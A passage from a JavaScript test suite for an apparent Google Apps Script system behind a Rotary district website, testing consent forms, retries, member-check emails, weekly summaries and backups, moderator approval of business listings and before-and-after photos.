  assert.ok(!JSON.stringify(data()).includes('confirm.me@example.com'));
});

test('photo consent: the activity form names children and guardians; Upgrade Sheet updates an older form once', () => {
  const ids = JSON.parse(env.props.get('FORM_IDS'));
  const item = env.forms[ids.activity].items.find((i) => i.title === Q.aConsent);
  assert.deepEqual([...item.choices], [env.context.PHOTO_CONSENT_TEXT]);
  assert.match(env.context.PHOTO_CONSENT_TEXT, /children, a parent or guardian/);
  item.choices = ['Everyone in these photos (or their guardian) agreed to them being published.'];
  assert.ok(env.run('upgradeSheet').some((l) => /photo consent wording/.test(l)));
  assert.deepEqual([...item.choices], [env.context.PHOTO_CONSENT_TEXT]);
  assert.ok(!env.run('upgradeSheet').some((l) => /photo consent wording/.test(l)), 'once');
  // the Show my details form says that the member is emailed when the club fills it in (1 Nov safeguards)
  assert.match(env.forms[JSON.parse(env.props.get('FORM_IDS')).show_details].description, /we email the member, and a district moderator checks it first/);
});

test('Google briefly slow: steps safe to repeat are tried again, others are not; Apply moderators lists what it could not finish', () => {
  const slow = (n, msg = 'Service Drive timed out while accessing document with ID x.') => { let left = n; return () => { if (left-- > 0) throw new Error(msg); return 'ok'; }; };
  const start = env.slept.length;
  assert.equal(env.run('retry_', slow(2)), 'ok');
  assert.deepEqual(env.slept.slice(start), [2000, 4000]);
  assert.throws(() => env.run('retry_', slow(3)), /timed out/, 'three tries at most');
  const n = env.slept.length;
  assert.throws(() => env.run('retry_', slow(1, 'Column "x" not found in settings')), /not found/);
  assert.equal(env.slept.length, n, 'a real error is not tried again');

  // Rebuild site now goes through when the settings tab answers slowly once
  const settings = env.main.getSheetByName('settings');
  let once = true;
  settings.getDataRange = function () {
    if (once) { once = false; throw new Error('Service Spreadsheets timed out while accessing document with ID x.'); }
    return Object.getPrototypeOf(this).getDataRange.call(this);
  };
  const t0 = Date.now();
  env.run('requestRebuild');
  delete settings.getDataRange;
  const stamp = env.main.rows('settings').find((r) => r.key === 'rebuild_requested_at').value;
  assert.ok(new Date(stamp).getTime() >= t0 - 1000, 'rebuild requested');

  // Apply moderators: a person Google keeps timing out on is listed; the others are done; running again finishes
  env.setUser('district.account@example.com');
  const mods = env.main.getSheetByName('moderators');
  mods.appendRow(['Content', 'Slow One', 'slow.one@example.com', 'TRUE', '', '', 'TRUE']);
  mods.appendRow(['Content', 'Quick One', 'quick.one@example.com', 'TRUE', '', '', 'TRUE']);
  const add = env.main.addEditor;
  env.main.addEditor = function (e) { if (e === 'slow.one@example.com') throw new Error('Service Drive timed out while accessing document with ID x.'); return add.call(this, e); };
  const plan = env.run('applyModerators');
  assert.equal(plan.failed.length, 1);
  assert.match(plan.failed[0], /slow\.one@example\.com/);
  assert.match(env.alerts.at(-1), /Done, except[\s\S]*run Apply moderators again[\s\S]*slow\.one@example\.com/);
  assert.ok(env.main.editors.includes('quick.one@example.com') && !env.main.editors.includes('slow.one@example.com'));
  delete env.main.addEditor;
  const again = env.run('applyModerators');
  assert.deepEqual([[...again.addMain], again.failed.length], [['slow.one@example.com'], 0]);
  assert.ok(env.main.editors.includes('slow.one@example.com'));
});

/* ---------- the yearly July member check (A1) and the weekly summary (A2), 16 Nov ---------- */

test('July member check: listed members with an email, July and August only, within the day\'s allowance, once a year', () => {
  const club = env.main.rows('clubs')[0];
  const base = { club_id: club.club_id, is_rotarian: true, status: 'active', listing_approved: true, directory_ok: true, profession: 'Doctor', area: 'Civil Lines', mobile: '9811122233' };
  const add = (id, extra) => env.run('appendRow_', env.priv, 'members_master', { ...base, member_id: id, name: 'Rtn Check ' + id, email: id + '@example.com', ...extra });
  add('9990001', {});
  add('9990002', { contact_ok: true });
  add('9990003', { directory_ok: false, birthday_ok: true, dob: '1970-03-12' });
  add('9990004', { email: '' }); // no email: nobody to ask
  add('9990005', { consent_updated_at: '2027-07-03' }); // just gave consent: no need to ask
  add('9990006', { listing_approved: false }); // not on the website
  const mine = () => env.mails.filter((m) => /still right\?$/.test(m.subject) && /^999000\d@/.test(m.to));
  assert.equal(env.run('memberCheckEmails_', '2027-06-30'), 0, 'not before July');
  assert.equal(env.run('memberCheckEmails_', '2027-11-16'), 0, 'not after August');
  // members from earlier tests are due too; mark them done so the counts are about these six
  const mm = env.priv.getSheetByName('members_master');
  const col = mm.data[0].indexOf('member_check_sent_at') + 1;
  mm.data.forEach((r, i) => { if (i > 0 && r[0] !== '' && !/^99900\d\d$/.test(String(r[0]))) mm.set(i + 1, col, '2027-07-01T00:00:00Z'); });
  env.quota.left = 22; // a busy day: only 2 fit while keeping 20 for moderators and replies
  assert.equal(env.run('memberCheckEmails_', '2027-07-05'), 2);
  env.quota.left = 100; // the next day
  assert.equal(env.run('memberCheckEmails_', '2027-07-06'), 1);
  assert.equal(env.run('memberCheckEmails_', '2027-07-07'), 0, 'each member once a year');
  assert.deepEqual(mine().map((m) => m.to).sort(), ['9990001@example.com', '9990002@example.com', '9990003@example.com']);
  const one = mine().find((m) => m.to === '9990002@example.com').body;
  assert.match(one, /Profession: Doctor/);
  assert.match(one, /WhatsApp button, so people can message you: yes/);
  assert.ok(one.includes(settingsMap().form_removal_url) && one.includes(settingsMap().form_consent_url), 'links to change or remove');
  assert.ok(!one.includes('9811122233'), 'never the mobile number');
  assert.match(mine().find((m) => m.to === '9990003@example.com').body, /In the member directory: no[\s\S]*birthday greeting on the Celebrations page: yes \(12 March,/);
  assert.ok(env.priv.rows('members_master').find((m) => m.member_id === '9990001').member_check_sent_at, 'when it was sent is kept');
  const next = mine().length;
  env.run('memberCheckEmails_', '2028-07-01');
  assert.equal(mine().length - next, 4, 'next July everyone again, including the one who gave consent in 2027');
  // the owner's sample: one member's email, sent only to the person who asks
  env.setUser('district.account@example.com');
  const before = env.mails.length;
  assert.match(env.run('sendMemberCheckSample'), /sent to district\.account@example\.com/);
  assert.equal(env.mails.length - before, 1);
  assert.match(env.mails.at(-1).subject, /^SAMPLE/);
  assert.equal(env.mails.at(-1).to, 'district.account@example.com');
  const sh = env.priv.getSheetByName('members_master');
  sh.data = sh.data.filter((r) => !/^99900\d\d$/.test(String(r[0])));
});

test('weekly summary: Monday 8 am to the owner: last build, a rebuild not yet run, waiting items, late removals, quiet clubs', () => {
  assert.equal(env.triggers.filter((t) => t.getHandlerFunction() === 'weeklySummary').length, 1, 'scheduled by setup');
  env.pages.buildInfo = { generated_at: '2026-11-15T01:42:09Z' };
  env.run('setSetting_', 'rebuild_requested_at', '2026-11-16T09:00:00Z');
  env.submit('removal', { [Q.rClub]: 'RC Kanpur', [Q.rName]: 'Rtn Slow Removal', [Q.rMobile]: '9876501111', [Q.rItems]: ['Birthday'] });
  const rr = env.priv.getSheetByName('removal_requests');
  rr.set(rr.getLastRow(), rr.data[0].indexOf('submitted_at') + 1, '2026-01-01T00:00:00Z');
  env.run('weeklySummary');
  let mail = env.mails.at(-1);
  assert.equal(mail.to, 'district.account@example.com', 'the district account until summary_emails is set');
  assert.match(mail.subject, /weekly summary/);
  for (const part of ['THE WEBSITE', 'Last built: 15', 'has not run yet', 'WENT LIVE IN THE LAST 7 DAYS', 'WAITING FOR MODERATORS', 'PAST THEIR 2-DAY LIMIT', 'QUIET CLUBS']) assert.ok(mail.body.includes(part), part);
  assert.ok(!mail.body.includes('Rtn Slow Removal') && !mail.body.includes('9876501111'), 'request IDs only, no names or numbers');
  env.run('setSetting_', 'summary_emails', 'owner.one@example.com, owner.two@example.com');
  env.run('sendWeeklySummaryNow');
  mail = env.mails.at(-1);
  assert.equal(mail.to, 'owner.one@example.com,owner.two@example.com');
  env.run('rejectRequest', 'removal', env.priv.rows('removal_requests').at(-1).id, 'test');
});

/* ---------- Release B (16 Nov): sample-data lock, weekly backup, missed rebuild, new Rotary year ---------- */

test('a Sheet with the real member list refuses to load sample data, which would go public', () => {
  for (let i = 0; i < 50; i++) env.run('appendRow_', env.priv, 'members_master', { member_id: String(8880000 + i), name: 'Real ' + i, is_rotarian: true, status: 'active' });
  const before = env.main.rows('activities').length;
  assert.deepEqual(plain(env.run('loadSampleData')), []);
  assert.match(env.alerts.at(-1), /not loaded: this Sheet feeds the public website \(it holds \d+ real members\)/);
  assert.equal(env.main.rows('activities').length, before);
  const sh = env.priv.getSheetByName('members_master');
  sh.data = sh.data.filter((r) => !/^888\d{4}$/.test(String(r[0])));
  assert.equal(data().sample_rows > 0, true, 'the data link counts sample rows, for the build to refuse them');
});

test('weekly backup: both Sheets copied into a private Backups folder next to them; the newest 8 weeks kept', () => {
  assert.equal(env.triggers.filter((t) => t.getHandlerFunction() === 'weeklyBackup').length, 1, 'scheduled by setup');
  const r = env.run('weeklyBackup', '2026-11-22');
  assert.deepEqual(plain(r.made), ['2026-11-22 – 3110Website', '2026-11-22 – Private sheet for Full Members List']);
  assert.equal(env.sharing.get('FOLDER-Backups'), 'PRIVATE', 'the folder is made private even if the parent is shared');
  for (let w = 1; w <= 9; w++) env.run('weeklyBackup', core.Core_addDays('2026-11-22', 7 * w));
  const left = [...env.files.values()].filter((f) => f.folder === 'FOLDER-Backups').map((f) => f.name).sort();
  assert.equal(left.length, 16);
  assert.ok(left[0].startsWith('2026-12-06'), 'the two oldest weeks were removed: ' + left[0]);
  assert.ok(settingsMap().last_backup_at, 'when the last backup ran is shown in settings');
});

test('weekly backup: the form copies Google makes with the Sheet go to the Bin; the real forms stay', () => {
  const formsIn = () => [...env.files.entries()].filter(([, f]) => f.mime === 'application/vnd.google-apps.form');
  const r = env.run('weeklyBackup', '2027-03-07');
  assert.ok(r.formsRemoved > 0, 'Google copied the linked forms, and the backup removed them');
  assert.deepEqual(formsIn(), [], 'no "Copy of" forms left next to the real ones');
  // a copy someone made by hand, not linked to a backup, is left alone
  env.files.set('HANDCOPY', { name: 'Copy of Club profile', folder: 'PARENT', mime: 'application/vnd.google-apps.form' });
  env.run('weeklyBackup', '2027-03-14');
  assert.deepEqual(formsIn().map(([id]) => id), ['HANDCOPY']);
  for (const form of ['FORM1', 'FORM2']) assert.ok(!env.trashed.includes(form), 'a live form is never moved to the Bin');
});

test('a rebuild that has not happened after 3 hours: one email to the owner; none once the site is built', () => {
  assert.equal(env.triggers.filter((t) => t.getHandlerFunction() === 'checkRebuild').length, 1, 'scheduled by setup');
  const asked = new Date(Date.now() - 4 * 3600000).toISOString();
  env.run('setSetting_', 'rebuild_requested_at', asked);
  env.pages.buildInfo = { generated_at: new Date(Date.now() - 5 * 3600000).toISOString() };
  const before = env.mails.length;
  assert.match(env.run('checkRebuild'), /^told /);
  assert.match(env.mails.at(-1).subject, /a rebuild has not happened/);
  assert.match(env.mails.at(-1).body, /Actions/);
  assert.equal(env.run('checkRebuild'), 'already told');
  env.run('setSetting_', 'rebuild_requested_at', new Date(Date.now() - 3.5 * 3600000).toISOString());
  env.pages.buildInfo = { generated_at: new Date().toISOString() };
  assert.equal(env.run('checkRebuild'), 'built');
  env.run('setSetting_', 'rebuild_requested_at', new Date().toISOString());
  assert.equal(env.run('checkRebuild'), 'nothing to check', 'a fresh request is given time');
  assert.equal(env.mails.length - before, 1);
});

test('Start new Rotary year: only once the new team is in; moves the year on, adds the outgoing Governor to past governors', () => {
  const year = settingsMap().current_rotary_year;
  const next = core.Core_nextRotaryYear(year);
  assert.equal(env.run('startNewRotaryYear'), '', 'nothing for the new year yet');
  assert.match(env.alerts.at(-1), new RegExp('Nothing for ' + next));
  assert.equal(settingsMap().current_rotary_year, year);
  const club = env.main.rows('clubs')[0];
  env.run('appendRow_', env.main, 'officers', { rotary_year: next, club_id: club.club_id, name: 'Rtn New President', role: 'President' });
  const dg = env.main.rows('functionaries').find((r) => r.rotary_year === year && r.role === 'District Governor');
  const pastBefore = env.main.rows('past_governors').length;
  const hadPast = env.main.rows('past_governors').some((p) => p.rotary_year === year);
  assert.equal(env.run('startNewRotaryYear'), next);
  assert.equal(settingsMap().current_rotary_year, next);
  if (dg && !hadPast) assert.equal(env.main.rows('past_governors').at(-1).name, dg.name);
  assert.match(env.alerts.at(-1), /Still to do by hand/);
  // put the sample back as it was for the tests that follow
  env.run('setSetting_', 'current_rotary_year', year);
  const off = env.main.getSheetByName('officers');
  off.data = off.data.filter((r) => !r.includes('Rtn New President'));
  const pg = env.main.getSheetByName('past_governors');
  pg.data = pg.data.slice(0, pastBefore + 1);
});


/* ---------- real data (29 Oct): gender column; Reset for production used once and removed (18 Nov) ---------- */

test('members_master has the gender column; Reset for production is gone (it removed every data row; used once on 29 Oct)', () => {
  assert.ok(env.priv.getSheetByName('members_master').getRange(1, 1, 1, 40).getValues()[0].includes('gender'), 'members_master has gender');
  assert.equal(typeof env.context.resetForProduction, 'undefined');
});

test('every file the sample-data generator reads is in the repository (17 Nov 2026: it read a file that was removed)', () => {
  const src = readFileSync(resolve(ROOT, 'tools/make-sample-data.mjs'), 'utf8');
  const files = [...src.matchAll(/readFileSync\(resolve\(ROOT, '([^']+)'\)/g)].map((m) => m[1]);
  assert.ok(files.includes('tools/sample-base.json'), files.join(', '));
  for (const f of files) assert.ok(existsSync(resolve(ROOT, f)), f);
});

test('the committed Code.gs is the bundle of the current source files (run npm run bundle-script after a change)', () => {
  const norm = (t) => t.replace(/\r\n/g, '\n');
  assert.ok(norm(readFileSync(resolve(ROOT, 'dist/apps-script/Code.gs'), 'utf8')) === norm(bundleCode()), 'dist/apps-script/Code.gs is out of date');
});

test('Rotary Means Business: the sender is found in the members list; members only; a newer listing replaces the older; removal takes it off (17 Nov)', () => {
  const clubs = Object.fromEntries(env.main.rows('clubs').filter((c) => c.status === 'active').map((c) => [c.club_id, c]));
  // earlier tests clear the sample, so this test brings its own member
  const club = Object.values(clubs)[0];
  const m = { member_id: '7770001', name: 'Rtn Biz Owner', club_id: club.club_id, is_rotarian: true, status: 'active', email: 'biz.owner@example.com' };
  env.run('appendRow_', env.priv, 'members_master', m);
  const send = (answers, email = m.email) => {
    env.submit('business', { [Q.club]: club.club_name, [Q.name]: m.name, [Q.bMemberId]: m.member_id, [Q.bMobile]: '9811111111',
      [Q.bTrade]: 'Shop / retail', [Q.bCity]: club.city, [Q.bConfirm]: ['yes'], ...answers }, email);
    return env.main.rows('businesses').at(-1);
  };
  // from the member's own email, with nothing to check: listed at once (Release 2)
  const first = send({ [Q.bName]: 'Test Opticians', [Q.bAbout]: 'Spectacles and lenses.', [Q.bWhatsapp]: '98222 22222', [Q.bTopics]: 'Eye care at work' });
  assert.match(first.id, /^BIZ-\d{4}$/);
  assert.deepEqual([first.status, first.member_id, first.member_name, first.moderator_note, first.approved_by],
    ['approved', m.member_id, m.name, '', "automatic: sent from the member's own email"]);
  assert.ok(env.mails.some((x) => /^Approved: business listing "Test Opticians"/.test(x.subject) && /\/rmb\//.test(x.body)));
  let pub = data().businesses.find((b) => b.id === first.id);
  assert.deepEqual([pub.name, pub.owner, pub.contact_link, pub.speaker_topics], ['Test Opticians', m.name, 'https://wa.me/919822222222', 'Eye care at work']);
  assert.ok(!('member_id' in pub) && !JSON.stringify(data()).includes('9811111111'), 'no member ID and no sender mobile on the website');

  // someone not in the members list: noted, and it cannot be approved
  env.submit('business', { [Q.club]: club.club_name, [Q.name]: 'Not A Member', [Q.bMobile]: '9833333000', [Q.bName]: 'Outsider Traders',
    [Q.bTrade]: 'Consultant', [Q.bCity]: club.city, [Q.bConfirm]: ['yes'] }, 'outsider@example.com');
  const outsider = env.main.rows('businesses').at(-1);
  assert.match(outsider.moderator_note, /Not found in the members list/);
  env.setActive('businesses', env.main.rows('businesses').length + 1);
  env.run('approveSelected');
  assert.match(env.alerts.at(-1), /Not approved: BIZ-\d{4} \(not found in the members list/);

  // sent from another email: the moderator is told to check with the member
  const update = send({ [Q.bName]: 'Test  opticians', [Q.bAbout]: 'Spectacles, lenses and eye checks.' }, 'someone.else@example.com');
  assert.match(update.moderator_note, /Not sent from the member's own email/);
  assert.match(update.moderator_note, new RegExp('Updates ' + first.id));
  env.setActive('businesses', env.main.rows('businesses').length + 1);
  env.run('approveSelected');
  assert.equal(env.main.rows('businesses').find((b) => b.id === first.id).status, 'replaced');
  pub = data().businesses.filter((b) => b.owner === m.name);
  assert.deepEqual(pub.map((b) => [b.id, b.about]), [[update.id, 'Spectacles, lenses and eye checks.']], 'only the newer listing is shown');

  // the member's own removal from their own email is done at once (Release 2)
  env.submit('removal', { [Q.rClub]: club.club_name, [Q.rName]: m.name, [Q.rMemberId]: m.member_id, [Q.rItems]: ['Business listing (Rotary Means Business)'] }, m.email);
  assert.equal(env.priv.rows('removal_requests').at(-1).status, 'approved');
  assert.equal(env.main.rows('businesses').find((b) => b.id === update.id).status, 'removed');
  assert.ok(!data().businesses.some((b) => b.owner === m.name), 'off the website');
});

test('before and after photos: filed from the hand-added questions, noted for the moderator, public only as a pair (17 Nov)', () => {
  const base = { [Q.club]: 'RC Agra', [Q.name]: 'Rtn A', [Q.role]: 'Secretary', [Q.mobile]: '9812345678', [Q.kind]: Q.kindActivity,
    [Q.aDate]: '2026-10-02', [Q.aTheme]: 'Providing clean water', [Q.aDesc]: 'The club built new toilets for girls at a government school, with water and a hand-washing station. '.repeat(2),
    'Photos (up to 3, each under 1 MB)': ['1MainPhotoAbCdEfGhIjKlMnOpQrStU'], [Q.aConsent]: ['yes'] };
  env.submit('activity', { ...base, [Q.aTitle]: 'Girls toilet block at a school',
    'Before photo (optional)': ['1BeforePhotoAbCdEfGhIjKlMnOpQr'], 'After photo (optional)': ['1AfterPhotoAbCdEfGhIjKlMnOpQrS'] });
  const both = env.main.rows('activities').at(-1);
  assert.equal(both.before_photo, 'drive:1BeforePhotoAbCdEfGhIjKlMnOpQr');
  assert.equal(both.after_photo, 'drive:1AfterPhotoAbCdEfGhIjKlMnOpQrS');
  assert.match(both.moderator_note, /Before and after photos: check they show the same place/);
  env.submit('activity', { ...base, [Q.aTitle]: 'Classroom painted', 'Before photo (optional)': ['1OnlyBeforeAbCdEfGhIjKlMnOpQrS'] });
  const one = env.main.rows('activities').at(-1);
  assert.match(one.moderator_note, /Only one of the before and after photos/);
  env.setActive('activities', env.main.rows('activities').length);
  env.run('approveSelected');
  env.setActive('activities', env.main.rows('activities').length + 1);
  env.run('approveSelected');
  const pub = data().activities;
  assert.deepEqual(plain(pub.find((a) => a.id === both.id).before_after),
    { before: 'drive:1BeforePhotoAbCdEfGhIjKlMnOpQr', after: 'drive:1AfterPhotoAbCdEfGhIjKlMnOpQrS' });
  assert.equal(pub.find((a) => a.id === one.id).before_after, null);
});

test('the activity form asks "District level?"; a Yes is noted for the moderator and shown on the website (17 Nov)', () => {
  const ids = JSON.parse(env.props.get('FORM_IDS'));
  const act = env.forms[ids.activity].titles();
  assert.equal(act[act.indexOf(Q.aAvenue) + 1], Q.aDistrict);
  assert.ok(env.forms[ids.update_details].items.find((i) => i.title === Q.uBusiness).choices.includes(env.context.BUSINESS_CHOICES.remove));
  env.submit('activity', { [Q.club]: 'RC Agra', [Q.name]: 'Rtn A', [Q.role]: 'Secretary', [Q.mobile]: '9812345678', [Q.kind]: Q.kindActivity,
    [Q.aTitle]: 'Inauguration of a global grant dialysis unit', [Q.aDate]: '2026-10-01', [Q.aTheme]: 'Fighting disease', [Q.aAvenue]: 'Community Service',
    [Q.aDistrict]: 'Yes', [Q.aDesc]: 'The district inaugurated a dialysis unit funded by a global grant with partner clubs abroad. '.repeat(2),
    [Q.aLink]: 'https://example.com/post', [Q.aConsent]: ['yes'] });
  const row = env.main.rows('activities').at(-1);
  assert.equal(row.district_level, true);
  assert.match(row.moderator_note, /Marked as district level: check the district organised it/);
  env.setActive('activities', env.main.rows('activities').length + 1);
  env.run('approveSelected');
  assert.equal(data().activities.find((a) => a.id === row.id).district_level, true);
});
